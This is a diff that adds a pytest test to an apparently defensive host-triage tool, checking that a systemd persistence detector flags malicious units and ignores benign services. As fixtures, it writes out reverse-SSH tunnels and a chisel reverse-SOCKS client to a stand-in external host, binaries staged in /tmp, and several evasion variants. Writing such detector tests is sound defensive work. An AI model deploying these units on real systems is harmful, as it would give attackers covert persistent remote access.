@@ -189,3 +189,73 @@ def test_host_triage_hardening_boundaries_home_root_symlink_ca_and_pg_ddl(tmp_pa
     )
     hits_crit = check_postgres_dual_graph(pg_with_prompts)
     assert len(hits_crit) == 1 and hits_crit[0].severity == "critical"
+
+
+def test_host_triage_systemd_persistence_catches_reverse_ssh_and_volatile_staging_with_zero_fp(tmp_path: Path) -> None:
+    """check_systemd_persistence flags SSH -R reverse tunnels, volatile-path bins, and tunnel tools; ignores normal services."""
+    from artex_defense.host_triage import check_systemd_persistence
+
+    root = tmp_path / "systemd_host"
+    unit_dir = root / "etc" / "systemd" / "system"
+    unit_dir.mkdir(parents=True)
+
+    # Benign stock services -> 0 hits
+    (unit_dir / "sshd.service").write_text("[Service]\nExecStart=/usr/sbin/sshd -D\n", encoding="utf-8")
+    (unit_dir / "nginx.service").write_text("[Service]\nExecStart=/usr/sbin/nginx -g 'daemon off;'\n", encoding="utf-8")
+    (unit_dir / "ssh-local-fwd.service").write_text(
+        "[Service]\nExecStart=/usr/bin/ssh -N -L 5432:127.0.0.1:5432 db@internal.local\n",
+        encoding="utf-8",
+    )
+    # Symlink to outside unit must be skipped safely
+    outside_unit = tmp_path / "outside.service"
+    outside_unit.write_text("[Service]\nExecStart=/tmp/staged_agent\n", encoding="utf-8")
+    (unit_dir / "linked.service").symlink_to(outside_unit)
+    assert check_systemd_persistence(root) == []
+
+    # Malicious custom units -> caught!
+    (unit_dir / "rev-tunnel.service").write_text(
+        "[Service]\nExecStart=-/usr/bin/ssh -o StrictHostKeyChecking=no -N -R 8080:127.0.0.1:22 relay@198.51.100.5\n",
+        encoding="utf-8",
+    )
+    (unit_dir / "tmp-socks.service").write_text(
+        "[Service]\nExecStart=/var/tmp/socks_srv --listen 127.0.0.1:1080\n",
+        encoding="utf-8",
+    )
+    (unit_dir / "chisel-persist.service").write_text(
+        "[Service]\nExecStart=/opt/tools/chisel client 198.51.100.5:443 R:socks\n",
+        encoding="utf-8",
+    )
+    # Evasion variants: quoted path, sh -c wrapper, compact -fNR8080: bind, -oRemoteForward=, and `\` line continuation
+    (unit_dir / "quoted-tmp.service").write_text(
+        '[Service]\nExecStart="/tmp/staged_agent" --bg\n',
+        encoding="utf-8",
+    )
+    (unit_dir / "sh-wrapper-vartmp.service").write_text(
+        '[Service]\nExecStart=/bin/sh -c "/var/tmp/beacon.sh"\n',
+        encoding="utf-8",
+    )
+    (unit_dir / "compact-ssh-r.service").write_text(
+        "[Service]\nExecStart=/usr/bin/ssh -fNR8080:127.0.0.1:22 ops@198.51.100.5\n",
+        encoding="utf-8",
+    )
+    (unit_dir / "opt-remotefwd.service").write_text(
+        "[Service]\nExecStart=/usr/bin/ssh -N -oRemoteForward=8080 127.0.0.1:22 ops@198.51.100.5\n",
+        encoding="utf-8",
+    )
+    (unit_dir / "multiline-ssh.service").write_text(
+        "[Service]\nExecStart=/usr/bin/ssh \\\n  -N -R 9001:127.0.0.1:22 ops@198.51.100.5\n",
+        encoding="utf-8",
+    )
+
+    hits = check_systemd_persistence(root)
+    by_unit = {Path(h.path_or_pid).name: h.severity for h in hits}
+    assert by_unit == {
+        "rev-tunnel.service": "high",
+        "tmp-socks.service": "high",
+        "chisel-persist.service": "critical",
+        "quoted-tmp.service": "high",
+        "sh-wrapper-vartmp.service": "high",
+        "compact-ssh-r.service": "high",
+        "opt-remotefwd.service": "high",
+        "multiline-ssh.service": "high",
+    }
